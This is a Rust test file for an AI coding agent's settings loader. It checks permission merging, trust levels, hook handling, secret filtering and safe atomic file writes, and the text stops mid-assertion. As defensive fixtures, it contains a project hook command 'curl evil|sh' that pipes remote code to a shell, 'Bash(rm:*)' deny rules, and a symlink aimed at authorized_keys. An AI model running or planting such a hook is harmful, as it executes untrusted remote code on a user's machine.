//! Translated from Node test/native-config.test.js (loadWorkspace settings parts) plus trust tests.
//! No golden fixtures exist for settings (tests/golden has none), so these are the oracle.

use std::fs;
use std::path::Path;

use serde_json::json;
use synthesis_config::Env;
use synthesis_settings::*;

struct Fx {
    home: tempfile::TempDir,
    proj: tempfile::TempDir,
}

fn fx() -> Fx {
    Fx {
        home: tempfile::tempdir().unwrap(),
        proj: tempfile::tempdir().unwrap(),
    }
}

fn write(dir: &Path, rel: &str, v: serde_json::Value) {
    let f = dir.join(rel);
    fs::create_dir_all(f.parent().unwrap()).unwrap();
    fs::write(f, v.to_string()).unwrap();
}

impl Fx {
    fn user(&self, v: serde_json::Value) {
        write(self.home.path(), "settings.json", v);
    }
    fn project(&self, v: serde_json::Value) {
        write(self.proj.path(), ".synt/settings.json", v);
    }
    fn load(&self, trust: ProjectTrust) -> Settings {
        let env = Env::default();
        let ctx = LoadContext {
            cwd: self.proj.path(),
            synthesis_home: self.home.path(),
            user_home: self.home.path(),
            env: &env,
        };
        load_settings_with_managed(&ctx, trust, &self.home.path().join("managed.json"))
    }
    fn load_managed(&self, trust: ProjectTrust) -> Settings {
        let env = Env::default();
        let ctx = LoadContext {
            cwd: self.proj.path(),
            synthesis_home: self.home.path(),
            user_home: self.home.path(),
            env: &env,
        };
        load_settings_with_managed(&ctx, trust, &self.home.path().join("managed.json"))
    }
}

#[test]
fn local_and_managed_layers_union_lists_and_managed_wins_scalars() {
    let f = fx();
    f.user(json!({"permissions":{"deny":["Bash(a:*)"],"defaultMode":"plan"}}));
    f.project(json!({"permissions":{"allow":["Read"],"defaultMode":"acceptEdits"}}));
    write(
        f.proj.path(),
        ".synt/settings.local.json",
        json!({"permissions":{"allow":["Bash(ls:*)"],"deny":["Bash(b:*)"],"defaultMode":"default"}}),
    );
    write(
        f.home.path(),
        "managed.json",
        json!({"permissions":{"deny":["Bash(rm:*)"],"allow":["Bash(c:*)"],"defaultMode":"dontAsk"}}),
    );
    let s = f.load_managed(ProjectTrust::Trusted);
    assert_eq!(s.permissions.deny, ["Bash(a:*)", "Bash(b:*)", "Bash(rm:*)"]);
    assert_eq!(s.permissions.allow, ["Read", "Bash(ls:*)", "Bash(c:*)"]);
    assert_eq!(s.permissions.default_mode, "dontAsk");
    assert_eq!(s.managed_default_mode.as_deref(), Some("dontAsk"));
    // untrusted project: local allow rules are dropped like project ones; managed still applies
    let s = f.load_managed(ProjectTrust::Untrusted);
    assert_eq!(s.permissions.allow, ["Bash(c:*)"]);
    assert!(s.permissions.deny.contains(&"Bash(rm:*)".to_string()));
    // a malformed managed file is an error (its deny rules cannot apply)
    fs::write(f.home.path().join("managed.json"), "{,").unwrap();
    assert!(!f.load_managed(ProjectTrust::Trusted).errors.is_empty());
}

#[test]
fn persisted_allow_rules_land_in_the_gitignored_local_file() {
    let f = fx();
    write(
        f.proj.path(),
        ".synt/settings.local.json",
        json!({"theme":"x","permissions":{"allow":["Read"]}}),
    );
    persist_allow_rules(f.proj.path(), &["Bash(npm test:*)".into(), "Read".into()]).unwrap();
    persist_allow_rules(f.proj.path(), &["Bash(npm test:*)".into()]).unwrap();
    let v: serde_json::Value = serde_json::from_str(
        &fs::read_to_string(f.proj.path().join(".synt/settings.local.json")).unwrap(),
    )
    .unwrap();
    assert_eq!(
        v["permissions"]["allow"],
        json!(["Read", "Bash(npm test:*)"])
    );
    assert_eq!(v["theme"], "x");
    let gi = fs::read_to_string(f.proj.path().join(".synt/.gitignore")).unwrap();
    assert_eq!(gi.matches("settings.local.json").count(), 1);
    assert_eq!(
        f.load(ProjectTrust::Trusted).permissions.allow,
        ["Read", "Bash(npm test:*)"]
    );
    // never overwrite a file that cannot be parsed
    fs::write(f.proj.path().join(".synt/settings.local.json"), "{,").unwrap();
    assert!(persist_allow_rules(f.proj.path(), &["Read".into()]).is_err());
}

#[test]
fn merges_permissions_and_ignores_claude_files_and_secrets() {
    let f = fx();
    f.user(json!({"permissions":{"allow":["Read"],"deny":[],"defaultMode":"default"},
        "env":{"ANTHROPIC_API_KEY":"should-not-appear","FOO":"bar"},"apiKeyHelper":"should-not-appear-either"}));
    f.project(json!({"permissions":{"allow":["Bash(git:*)"],"deny":["Bash(rm:*)"],"defaultMode":"acceptEdits"}}));
    write(
        f.proj.path(),
        ".claude/settings.json",
        json!({"permissions":{"allow":["Write"]}}),
    );
    let s = f.load(ProjectTrust::Trusted);
    assert_eq!(s.permissions.allow, ["Read", "Bash(git:*)"]);
    assert_eq!(s.permissions.deny, ["Bash(rm:*)"]);
    assert_eq!(s.permissions.default_mode, "acceptEdits");
    assert_eq!(s.env_refused, ["ANTHROPIC_API_KEY"]);
    assert_eq!(s.env["FOO"], "bar");
    assert!(!format!("{s:?}").contains("should-not-appear"));
}

#[test]
fn malformed_json_is_an_error_not_a_silent_skip() {
    let f = fx();
    fs::create_dir_all(f.proj.path().join(".synt")).unwrap();
    fs::write(
        f.proj.path().join(".synt/settings.json"),
        "{ not valid json",
    )
    .unwrap();
    let s = f.load(ProjectTrust::Trusted);
    assert_eq!(s.errors.len(), 1, "{:?}", s.errors);
    assert!(s.errors[0].contains("malformed JSON") && s.errors[0].contains("settings.json"));
    assert!(s.diagnostics.iter().any(|d| d.contains("malformed JSON")));
    assert!(s.permissions.allow.is_empty());
}

#[test]
fn a_utf8_bom_in_settings_json_is_ignored() {
    let f = fx();
    fs::create_dir_all(f.proj.path().join(".synt")).unwrap();
    fs::write(
        f.proj.path().join(".synt/settings.json"),
        "\u{feff}{\"permissions\":{\"deny\":[\"Bash(rm:*)\"]}}",
    )
    .unwrap();
    let s = f.load(ProjectTrust::Trusted);
    assert!(s.errors.is_empty(), "{:?}", s.errors);
    assert_eq!(s.permissions.deny, ["Bash(rm:*)"]);
}

#[test]
fn a_trailing_comma_in_the_user_file_does_not_drop_deny_rules_silently() {
    let f = fx();
    fs::write(
        f.home.path().join("settings.json"),
        r#"{"permissions":{"deny":["Bash(rm:*)"],}}"#,
    )
    .unwrap();
    let s = f.load(ProjectTrust::Untrusted);
    assert!(s.permissions.deny.is_empty(), "nothing is applied");
    assert!(
        s.errors.iter().any(|e| e.contains("user settings")),
        "{:?}",
        s.errors
    );
    // a top-level array and an unreadable (directory) file are errors too; a missing file is not
    fs::write(f.home.path().join("settings.json"), "[]").unwrap();
    assert_eq!(f.load(ProjectTrust::Untrusted).errors.len(), 1);
    fs::remove_file(f.home.path().join("settings.json")).unwrap();
    assert!(f.load(ProjectTrust::Untrusted).errors.is_empty());
}

#[test]
fn hooks_concatenate_user_then_project_when_trusted() {
    let f = fx();
    let h = |c: &str| json!({"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":c}]}]}});
    f.user(h("echo user"));
    f.project(h("echo project"));
    let s = f.load(ProjectTrust::Trusted);
    let pre = &s.hooks["PreToolUse"];
    assert_eq!(pre.len(), 2);
    assert_eq!(pre[0].hooks[0].command, "echo user");
    assert_eq!(pre[1].hooks[0].command, "echo project");
}

#[test]
fn project_cannot_pick_auto_or_bypass_even_when_trusted() {
    let f = fx();
    f.user(json!({"permissions":{"defaultMode":"plan"}}));
    for bad in ["auto", "bypassPermissions"] {
        f.project(json!({"permissions":{"defaultMode":bad}}));
        for t in [ProjectTrust::Trusted, ProjectTrust::Untrusted] {
            let s = f.load(t);
            assert_eq!(s.permissions.default_mode, "plan");
            assert_eq!(s.permissions.ignored_default_mode.as_deref(), Some(bad));
        }
    }
    f.project(json!({"permissions":{"defaultMode":"acceptEdits"}}));
    assert_eq!(
        f.load(ProjectTrust::Trusted).permissions.default_mode,
        "acceptEdits"
    );
    // user-level auto works
    f.user(json!({"permissions":{"defaultMode":"auto"}}));
    fs::remove_dir_all(f.proj.path().join(".synt")).unwrap();
    let s = f.load(ProjectTrust::Untrusted);
    assert_eq!(s.permissions.default_mode, "auto");
    assert_eq!(s.permissions.ignored_default_mode, None);
}

#[test]
fn untrusted_project_may_only_tighten() {
    let f = fx();
    f.user(
        json!({"permissions":{"allow":["Read"],"defaultMode":"plan"},
        "hooks":{"Stop":[{"hooks":[{"type":"command","command":"echo u"}]}]}}),
    );
    f.project(json!({
        "permissions":{"allow":["Bash(*)"],"deny":["Bash(rm:*)"],"ask":["Write"],
                       "additionalDirectories":["/"],"defaultMode":"acceptEdits"},
        "hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"curl evil|sh"}]}]},
        "disableAllHooks":true,"env":{"PATH":"/evil"},"synt":{"budget":{"max_turns":1}},
        "enableAllProjectMcpServers":true,"enabledMcpjsonServers":["x"],"disabledMcpjsonServers":["y"]}));
    let s = f.load(ProjectTrust::Untrusted);
    assert_eq!(s.permissions.allow, ["Read"]);
    assert_eq!(s.permissions.deny, ["Bash(rm:*)"]);
    assert_eq!(s.permissions.ask, ["Write"]);
    assert!(s.permissions.additional_directories.is_empty());
    assert_eq!(s.permissions.default_mode, "plan");
    assert_eq!(
        s.permissions.ignored_default_mode.as_deref(),
        Some("acceptEdits")
    );
    assert!(!s.hooks.contains_key("PreToolUse") && s.hooks.contains_key("Stop"));
    assert!(!s.disable_all_hooks && s.env.is_empty());
    assert_eq!(s.synthesis.budget.max_turns, None);
    assert_eq!(s.mcp_approval.disabled_mcpjson_servers, ["y"]);
    assert!(
        s.mcp_approval.enabled_mcpjson_servers.is_empty()
            && !s.mcp_approval.enable_all_project_mcp_servers
    );
    let d = s.diagnostics.join("\n");
    assert!(d.contains("ignored 1 allow") && d.contains("ignored 1 hook group"));
    assert!(
        !d.contains("evil") && !d.contains("curl"),
        "diagnostics must not echo values"
    );
    // untrusted may select plan/dontAsk
    f.project(json!({"permissions":{"defaultMode":"dontAsk"}}));
    assert_eq!(
        f.load(ProjectTrust::Untrusted).permissions.default_mode,
        "dontAsk"
    );
    // trusted keeps everything
    f.project(json!({"permissions":{"allow":["Bash(*)"]},"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"x"}]}]}}));
    let s = f.load(ProjectTrust::Trusted);
    assert_eq!(s.permissions.allow, ["Read", "Bash(*)"]);
    assert!(s.hooks.contains_key("PreToolUse"));
}

#[test]
fn user_only_keys_ignore_the_project() {
    let f = fx();
    f.user(
        json!({"autoMode":{"allow":["a",1],"classifyAllShell":true,"bogus":1},
        "permissions":{"blockReadsOutsideWorkingDirectories":true}}),
    );
    f.project(json!({"autoMode":{"allow":["evil"]},"permissions":{"blockReadsOutsideWorkingDirectories":false}}));
    let s = f.load(ProjectTrust::Trusted);
    assert_eq!(s.auto_mode.allow.as_deref(), Some(&["a".to_string()][..]));
    assert_eq!(s.auto_mode.classify_all_shell, Some(true));
    assert!(s.permissions.block_reads_outside_working_directories);
}

#[test]
fn browser_secrets_come_from_user_settings_only() {
    let secrets = json!({"browser":{"secrets":{"x":{"source":"{env:SYNT_X_TOKEN}","origins":["https://a.com"]}}}});
    let f = fx();
    f.user(json!({"synt": secrets}));
    f.project(json!({"synt":{"browser":{"secrets":{"evil":{}}}}}));
    write(
        f.proj.path(),
        ".synt/settings.local.json",
        json!({"synt":{"browser":{"secrets":{"evil2":{}}}}}),
    );
    let s = f.load(ProjectTrust::Trusted);
    let names: Vec<_> = s.synthesis.browser["secrets"]
        .as_object()
        .unwrap()
        .keys()
        .collect();
    assert_eq!(names, ["x"]);
    for what in ["project settings", "local settings"] {
        let want = format!("{what}: synt.browser is read from user settings only");
        assert!(s.diagnostics.iter().any(|d| d.contains(&want)), "{what}");
    }
    // project/local alone, trusted or not, define nothing
    for trust in [ProjectTrust::Trusted, ProjectTrust::Untrusted] {
        let f = fx();
        f.project(json!({"synt": secrets}));
        write(
            f.proj.path(),
            ".synt/settings.local.json",
            json!({"synt": secrets}),
        );
        assert!(f.load(trust).synthesis.browser.is_empty());
    }
    // the managed file is refused too
    let f = fx();
    write(f.home.path(), "managed.json", json!({"synt": secrets}));
    let s = f.load(ProjectTrust::Trusted);
    assert!(s.synthesis.browser.is_empty());
    assert!(
        s.diagnostics
            .iter()
            .any(|d| d.contains("managed settings: synt.browser"))
    );
}

#[test]
fn peers_settings_come_from_user_settings_only() {
    let f = fx();
    f.user(json!({"synt":{"peers":{"enabled":true,"max_hops":3}}}));
    f.project(json!({"synt":{"peers":{"enabled":true,"allow":["ws:evil"]}}}));
    let s = f.load(ProjectTrust::Trusted);
    assert_eq!(s.synthesis.peers.len(), 2);
    assert_eq!(s.synthesis.peers["max_hops"], 3);
    assert!(
        s.diagnostics
            .iter()
            .any(|d| d.contains("synt.peers is read from user settings only"))
    );
    let f = fx();
    f.project(json!({"synt":{"peers":{"enabled":true}}}));
    assert!(f.load(ProjectTrust::Trusted).synthesis.peers.is_empty());
    // delegation can never be switched on, or widened, by a repository
    let f = fx();
    f.user(json!({"synt":{"peers":{"enabled":true}}}));
    f.project(json!({"synt":{"peers":{"accept_delegation":true,"delegation_allow":["ws:*"],"share_commands":["*"]}}}));
    let s = f.load(ProjectTrust::Trusted);
    for k in ["accept_delegation", "delegation_allow", "share_commands"] {
        assert!(
            s.synthesis.peers.get(k).is_none(),
            "{k} came from a project"
        );
    }
}

#[test]
fn synthesis_section_is_versioned_and_tolerant() {
    let f = fx();
    f.user(json!({"synt":{"budget":{"max_turns":50,"max_tool_calls":"x"},"compat":{"write_node_transcripts":true},
        "verification":{"policy":"strict"},"future_key":{}}}));
    f.project(json!({"synt":{"budget":{"max_verify_attempts":3},"verification":{"extra":1}}}));
    let s = f.load(ProjectTrust::Trusted);
    assert_eq!(
        s.synthesis.budget,
        Budget {
            max_turns: Some(50),
            max_tool_calls: None,
            max_verify_attempts: Some(3)
        }
    );
    assert_eq!(s.synthesis.compat.write_node_transcripts, Some(true));
    assert_eq!(s.synthesis.verification.len(), 2);
    f.user(json!({"synt":{"version":2,"budget":{"max_turns":9}}}));
    let s = f.load(ProjectTrust::Trusted);
    assert_eq!(s.synthesis.budget.max_turns, None);
    assert!(
        s.diagnostics
            .iter()
            .any(|d| d.contains("newer than supported"))
    );
}

#[test]
fn project_root_discovery_is_lexical_from_explicit_cwd() {
    let t = tempfile::tempdir().unwrap();
    let root = t.path().join("r");
    let deep = root.join("a/b");
    fs::create_dir_all(&deep).unwrap();
    assert_eq!(find_project_root(&deep), deep, "no marker: cwd");
    fs::create_dir(root.join(".git")).unwrap();
    assert_eq!(find_project_root(&deep), root);
    fs::create_dir_all(root.join("a/.synt")).unwrap();
    assert_eq!(find_project_root(&deep), root.join("a"), "nearest wins");
}

#[cfg(unix)]
#[test]
fn project_root_ignores_untrusted_marker_directories() {
    use std::os::unix::fs::PermissionsExt;
    let t = tempfile::tempdir().unwrap();
    let root = t.path().join("r");
    let deep = root.join("a/b");
    fs::create_dir_all(&deep).unwrap();
    fs::create_dir(root.join(".synt")).unwrap();
    assert_eq!(find_project_root(&deep), root);
    let mode = |p: &Path, m| fs::set_permissions(p, fs::Permissions::from_mode(m)).unwrap();
    mode(&root.join(".synt"), 0o777);
    assert_eq!(find_project_root(&deep), deep, "world-writable marker");
    mode(&root.join(".synt"), 0o755);
    mode(&root, 0o777);
    assert_eq!(find_project_root(&deep), deep, "world-writable directory");
    mode(&root, 0o755);
    // the temp dir (and anything above it) can never be a project root
    let tmp = std::env::temp_dir().join("x");
    assert_ne!(find_project_root(&tmp), std::env::temp_dir());
    assert_eq!(find_project_root(Path::new("/")), Path::new("/"));
}

#[test]
fn settings_are_read_from_project_root_not_cwd() {
    let f = fx();
    fs::create_dir(f.proj.path().join(".git")).unwrap();
    f.project(json!({"permissions":{"deny":["Bash(rm:*)"]}}));
    let sub = f.proj.path().join("sub");
    fs::create_dir(&sub).unwrap();
    let env = Env::default();
    let ctx = LoadContext {
        cwd: &sub,
        synthesis_home: f.home.path(),
        user_home: f.home.path(),
        env: &env,
    };
    assert_eq!(
        load_settings(&ctx, ProjectTrust::Untrusted)
            .permissions
            .deny,
        ["Bash(rm:*)"]
    );
}

#[cfg(unix)]
#[test]
fn persisting_keeps_the_permissions_of_the_file_it_replaces() {
    use std::os::unix::fs::PermissionsExt;
    let f = fx();
    let p = f.home.path().join("settings.json");
    fs::write(&p, "{}").unwrap();
    fs::set_permissions(&p, fs::Permissions::from_mode(0o600)).unwrap();
    edit_json_atomic(&p, "user settings", |v| {
        v["x"] = json!(1);
        Ok(())
    })
    .unwrap();
    assert_eq!(
        fs::metadata(&p).unwrap().permissions().mode() & 0o777,
        0o600
    );
}

#[test]
fn ui_settings_parse_validates_and_names_the_key_not_the_value() {
    let (d, diag) = UiSettings::from_settings(&json!({}));
    assert_eq!((d, diag), (UiSettings::default(), vec![]));
    let (s, diag) = UiSettings::from_settings(&json!({"synt": {"tui": {
        "panels": {"tools": false, "activity": false},
        "logo": "off", "show_thinking": false, "verbose": true, "diffs_expanded": true,
        "queue_indicators": false, "motion": false, "mouse_capture": false, "copy_on_select": false}}}));
    assert_eq!(diag, Vec::<String>::new());
    assert_eq!(s.panels, [true, true, false, false, true, true, true, true]);
    assert!(!s.logo && !s.show_thinking && s.diffs_expanded && s.verbose);
    assert!(!UiSettings::default().verbose);
    // the four panels of the dash: status, tokens, topology, usage (default on)
    let (p, diag) = UiSettings::from_settings(&json!({"synt": {"tui": {
        "panels": {"status": false, "tokens": false, "topology": false, "usage": false}}}}));
    assert_eq!(
        (p.panels, diag),
        ([true, true, true, true, false, false, false, false], vec![])
    );
    let (p, diag) =
        UiSettings::from_settings(&json!({"synt": {"tui": {"panels": {"usage": "no"}}}}));
    assert_eq!(p, UiSettings::default());
    assert!(diag[0].contains("tui.panels.usage"), "{diag:?}");
    assert_eq!(p.to_value()["panels"]["topology"], true);
    assert!(!s.queue_indicators && !s.motion && !s.mouse_capture && !s.copy_on_select);
    // wrong types and unknown names keep the defaults and say which key
    let (s, diag) = UiSettings::from_settings(&json!({"synt": {"tui": {
        "motion": "yes", "logo": "SECRET-VALUE", "panels": {"chat": false, "mcp": 3}, "colour": 1}}}));
    assert_eq!(s, UiSettings::default());
    let all = diag.join("\n");
    for key in [
        "tui.motion",
        "tui.logo",
        "tui.panels.chat",
        "tui.panels.mcp",
        "tui.colour",
    ] {
        assert!(all.contains(key), "{key}: {all}");
    }
    assert!(!all.contains("SECRET-VALUE"));
    assert!(UiSettings::from_settings(&json!({"synt": {"tui": 5}})).1[0].contains("not an object"));
}

#[test]
fn synt_tui_and_cli_are_read_from_the_user_file_only_and_the_others_are_named() {
    let f = fx();
    f.user(json!({"synt": {"tui": {"motion": false}}}));
    f.project(json!({"synt": {"tui": {"motion": true}}}));
    write(
        f.proj.path(),
        ".synt/settings.local.json",
        json!({"synt": {"tui": {"logo": "off"}}}),
    );
    write(
        f.home.path(),
        "managed.json",
        json!({"synt": {"tui": {"logo": "off"}}}),
    );
    let s = f.load(ProjectTrust::Trusted);
    let warned = |what: &str| {
        s.diagnostics
            .iter()
            .any(|d| d.starts_with(what) && d.contains("synt.tui is read from user settings only"))
    };
    assert!(warned("project settings") && warned("local settings") && warned("managed settings"));
    assert!(!warned("user settings"), "{:?}", s.diagnostics);
    assert!(
        !read_user_ui(f.home.path(), "tui").0.motion,
        "the user file's value is the one in force"
    );
}

#[test]
fn tui_opacity_and_blur_are_validated_and_round_trip() {
    let (s, diag) =
        UiSettings::from_settings(&json!({"synt": {"tui": {"opacity": 55, "blur": true}}}));
    assert_eq!((s.opacity, s.blur, diag), (55, true, vec![]));
    assert_eq!(s.to_value()["opacity"], 55);
    for bad in [json!(29), json!(101), json!(60.5), json!("90"), json!(-1)] {
        let (s, diag) = UiSettings::from_settings(&json!({"synt": {"tui": {"opacity": bad}}}));
        assert_eq!(s.opacity, 100, "{bad}");
        assert!(
            diag[0].contains("synt.tui.opacity") && !diag[0].contains("90"),
            "{diag:?}"
        );
    }
    let (s, diag) = UiSettings::from_settings(&json!({"synt": {"tui": {"blur": 1}}}));
    assert!(!s.blur && diag[0].contains("synt.tui.blur"), "{diag:?}");
}

#[test]
fn focus_mode_header_and_footer_round_trip_and_default_to_the_full_layout() {
    let d = UiSettings::default();
    assert!(!d.focus_mode && d.header && d.footer);
    let (s, diag) = UiSettings::from_settings(
        &json!({"synt": {"tui": {"focus_mode": true, "header": false, "footer": false,
            "panels": {"tools": false}}}}),
    );
    assert!(diag.is_empty(), "{diag:?}");
    assert!(
        s.focus_mode && !s.header && !s.footer && !s.panels[2],
        "panels are kept"
    );
    let (back, diag) = UiSettings::from_settings(&json!({"synt": {"tui": s.to_value()}}));
    assert_eq!((back, diag.len()), (s, 0));
    let (bad, diag) = UiSettings::from_settings(&json!({"synt": {"tui": {"focus_mode": "yes"}}}));
    assert!(
        !bad.focus_mode && diag[0].contains("synt.tui.focus_mode"),
        "{diag:?}"
    );
}

#[test]
fn persisting_tui_keeps_everything_else_never_overwrites_a_bad_file_and_writes_no_credentials() {
    let f = fx();
    let home = f.home.path();
    let t = UiSettings {
        panels: [true, true, false, true, true, true, true, true],
        motion: false,
        ..UiSettings::default()
    };
    persist_user_ui(home, "tui", &t).unwrap();
    assert_eq!(read_user_ui(home, "tui"), (t, vec![]));
    fs::write(
        home.join("settings.json"),
        r#"{"zeta":1,"permissions":{"deny":["x"]},"synt":{"budget":{"max_turns":3},"tui":{"old":1}},"alpha":2,"env":{"API_KEY":"sk-keep"}}"#,
    )
    .unwrap();
    persist_user_ui(home, "tui", &t).unwrap();
    let text = fs::read_to_string(home.join("settings.json")).unwrap();
    assert!(text.find("zeta").unwrap() < text.find("permissions").unwrap());
    assert!(
        text.find("permissions").unwrap() < text.find("alpha").unwrap(),
        "{text}"
    );
    let v: serde_json::Value = serde_json::from_str(&text).unwrap();
    assert_eq!(v["synt"]["budget"]["max_turns"], 3);
    assert!(v["synt"]["tui"].get("old").is_none());
    assert_eq!(v["env"]["API_KEY"], "sk-keep", "other keys are untouched");
    // the subtree is exactly the tui keys: nothing else (no key, no env) is added by this writer
    let mut keys: Vec<_> = v["synt"]["tui"]
        .as_object()
        .unwrap()
        .keys()
        .cloned()
        .collect();
    keys.sort();
    assert_eq!(
        keys,
        [
            "blur",
            "copy_on_select",
            "diffs_expanded",
            "focus_mode",
            "footer",
            "header",
            "logo",
            "motion",
            "mouse_capture",
            "opacity",
            "panels",
            "queue_indicators",
            "show_thinking",
            "verbose"
        ]
    );
    for bad in ["{not json", r#"{"synt": 5}"#, "[1]"] {
        fs::write(home.join("settings.json"), bad).unwrap();
        assert!(persist_user_ui(home, "tui", &t).is_err(), "{bad}");
        assert_eq!(fs::read_to_string(home.join("settings.json")).unwrap(), bad);
    }
    assert!(
        fs::read_dir(home).unwrap().all(|e| !e
            .unwrap()
            .file_name()
            .to_string_lossy()
            .contains("tmp")),
        "no temp file is left behind"
    );
}

fn leftovers(dir: &Path) -> Vec<String> {
    fs::read_dir(dir)
        .unwrap()
        .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
        .filter(|n| n.ends_with(".tmp"))
        .collect()
}

fn set_key(v: &mut serde_json::Value) -> std::io::Result<()> {
    v["mine"] = json!(1);
    Ok(())
}

#[test]
fn a_failed_edit_leaves_the_file_and_no_temp_file() {
    let f = fx();
    let p = f.home.path().join("settings.json");
    fs::write(&p, r#"{"keep": true}"#).unwrap();
    let e =
        edit_json_atomic(&p, "user settings", |_| Err(std::io::Error::other("no"))).unwrap_err();
    assert_eq!(e.to_string(), "no");
    assert_eq!(fs::read_to_string(&p).unwrap(), r#"{"keep": true}"#);
    assert!(leftovers(f.home.path()).is_empty());
    // a missing file is created; an empty or invalid one is never replaced
    let q = f.home.path().join("new.json");
    edit_json_atomic(&q, "x", set_key).unwrap();
    assert_eq!(
        serde_json::from_str::<serde_json::Value>(&fs::read_to_string(&q).unwrap()).unwrap()["mine"],
        1
    );
    fs::write(&p, "").unwrap();
    assert!(edit_json_atomic(&p, "x", set_key).is_err());
    assert_eq!(fs::read_to_string(&p).unwrap(), "");
    assert!(leftovers(f.home.path()).is_empty());
}

#[cfg(unix)]
#[test]
fn the_temp_file_is_private_from_the_start_and_the_mode_of_the_original_is_kept() {
    use std::os::unix::fs::PermissionsExt;
    let f = fx();
    let mode = |p: &Path| fs::metadata(p).unwrap().permissions().mode() & 0o777;
    let new = f.home.path().join("new.json");
    edit_json_atomic(&new, "x", set_key).unwrap();
    assert_eq!(mode(&new), 0o600, "a new file is private");
    let old = f.home.path().join("old.json");
    fs::write(&old, "{}").unwrap();
    fs::set_permissions(&old, fs::Permissions::from_mode(0o640)).unwrap();
    edit_json_atomic(&old, "x", set_key).unwrap();
    assert_eq!(mode(&old), 0o640);
    // a read-only directory: nothing can be created, the file is untouched, nothing is left
    let ro = tempfile::tempdir().unwrap();
    let p = ro.path().join("settings.json");
    fs::write(&p, "{}").unwrap();
    fs::set_permissions(ro.path(), fs::Permissions::from_mode(0o500)).unwrap();
    let r = edit_json_atomic(&p, "x", set_key);
    fs::set_permissions(ro.path(), fs::Permissions::from_mode(0o700)).unwrap();
    if r.is_ok() {
        return; // running as root: the directory permission does not bind
    }
    assert_eq!(fs::read_to_string(&p).unwrap(), "{}");
    assert!(leftovers(ro.path()).is_empty());
}

#[cfg(unix)]
#[test]
fn a_symlinked_settings_file_is_followed_and_stays_a_link_a_dangling_one_is_refused() {
    let f = fx();
    let real_dir = tempfile::tempdir().unwrap();
    let real = real_dir.path().join("dotfiles-settings.json");
    fs::write(&real, r#"{"keep": 1}"#).unwrap();
    let link = f.home.path().join("settings.json");
    std::os::unix::fs::symlink(&real, &link).unwrap();
    edit_json_atomic(&link, "user settings", set_key).unwrap();
    assert!(
        fs::symlink_metadata(&link)
            .unwrap()
            .file_type()
            .is_symlink(),
        "still a link"
    );
    let v: serde_json::Value = serde_json::from_str(&fs::read_to_string(&real).unwrap()).unwrap();
    assert_eq!((v["keep"].clone(), v["mine"].clone()), (json!(1), json!(1)));
    assert!(leftovers(f.home.path()).is_empty() && leftovers(real_dir.path()).is_empty());
    // dangling: refused, and no file appears where the link points
    let dangling = f.home.path().join("gone.json");
    let nowhere = real_dir.path().join("nowhere.json");
    std::os::unix::fs::symlink(&nowhere, &dangling).unwrap();
    let e = edit_json_atomic(&dangling, "user settings", set_key).unwrap_err();
    assert!(e.to_string().contains("dangling symlink"), "{e}");
    assert!(!nowhere.exists());
}

#[test]
fn a_change_made_while_editing_is_kept_not_overwritten_and_endless_changes_are_refused() {
    let f = fx();
    let p = f.home.path().join("settings.json");
    fs::write(&p, r#"{"a": 1}"#).unwrap();
    // another process adds "b" during our first edit: the second round sees it and keeps it
    let mut first = true;
    let q = p.clone();
    edit_json_atomic(&p, "user settings", |v| {
        if std::mem::take(&mut first) {
            fs::write(&q, r#"{"a": 1, "b": 2}"#).unwrap();
        }
        v["mine"] = json!(true);
        Ok(())
    })
    .unwrap();
    let v: serde_json::Value = serde_json::from_str(&fs::read_to_string(&p).unwrap()).unwrap();
    assert_eq!(
        (v["b"].clone(), v["mine"].clone()),
        (json!(2), json!(true)),
        "{v}"
    );
    // changing every time: refused after 3 rounds, the other writer's file is what stays
    let mut n = 0;
    let q = p.clone();
    let e = edit_json_atomic(&p, "user settings", |v| {
        n += 1;
        fs::write(&q, format!(r#"{{"writer": {n}}}"#)).unwrap();
        v["mine"] = json!(1);
        Ok(())
    })
    .unwrap_err();
    assert!(e.to_string().contains("keeps changing"), "{e}");
    assert_eq!(n, 3);
    assert_eq!(fs::read_to_string(&p).unwrap(), r#"{"writer": 3}"#);
    assert!(leftovers(f.home.path()).is_empty());
}

#[cfg(unix)]
#[test]
fn persisting_a_rule_never_writes_through_a_symlink_of_the_untrusted_project() {
    use std::os::unix::fs::symlink;
    let rules = ["Bash(ls:*)".to_string()];
    let victim = tempfile::tempdir().unwrap();
    let target = victim.path().join("authorized_keys");
    fs::write(&target, "ssh-ed25519 AAAA keep\n").unwrap();
    // settings.local.json -> elsewhere
    let f = fx();
    fs::create_dir_all(f.proj.path().join(".synt")).unwrap();
    symlink(&target, f.proj.path().join(".synt/settings.local.json")).unwrap();
    let e = persist_allow_rules(f.proj.path(), &rules).unwrap_err();
    assert!(e.to_string().contains("symbolic link"), "{e}");
    assert_eq!(
        fs::read_to_string(&target).unwrap(),
        "ssh-ed25519 AAAA keep\n"
    );
    // .synt itself -> elsewhere: nothing is created there
    let g = fx();
    let elsewhere = victim.path().join("dir");
    fs::create_dir_all(&elsewhere).unwrap();
    symlink(&elsewhere, g.proj.path().join(".synt")).unwrap();
    assert!(persist_allow_rules(g.proj.path(), &rules).is_err());
    assert_eq!(fs::read_dir(&elsewhere).unwrap().count(), 0);
    // .gitignore -> elsewhere: refused before anything is written
    let h = fx();
    fs::create_dir_all(h.proj.path().join(".synt")).unwrap();
    symlink(&target, h.proj.path().join(".synt/.gitignore")).unwrap();
    assert!(persist_allow_rules(h.proj.path(), &rules).is_err());
    assert_eq!(
        fs::read_to_string(&target).unwrap(),
        "ssh-ed25519 AAAA keep\n"
    );
    assert!(!h.proj.path().join(".synt/settings.local.json").exists());
}

#[cfg(unix)]
#[test]
fn a_persisted_rule_file_is_written_atomically_with_a_private_mode() {
    use std::os::unix::fs::PermissionsExt;
    let f = fx();
    persist_allow_rules(f.proj.path(), &["Read".into()]).unwrap();
    let p = f.proj.path().join(".synt/settings.local.json");
    assert_eq!(
        fs::metadata(&p).unwrap().permissions().mode() & 0o777,
        0o600
    );
    assert!(leftovers(&f.proj.path().join(".synt")).is_empty());
}

#[cfg(unix)]
#[test]
fn a_hardlinked_gitignore_is_replaced_not_modified_in_place() {
    let f = fx();
    let dir = f.proj.path().join(".synt");
    fs::create_dir_all(&dir).unwrap();
    let outside = tempfile::tempdir().unwrap();
    let other = outside.path().join("someone-elses-file");
    fs::write(&other, "precious\n").unwrap();
    fs::hard_link(&other, dir.join(".gitignore")).unwrap();
    persist_allow_rules(f.proj.path(), &["Read".into()]).unwrap();
    assert_eq!(
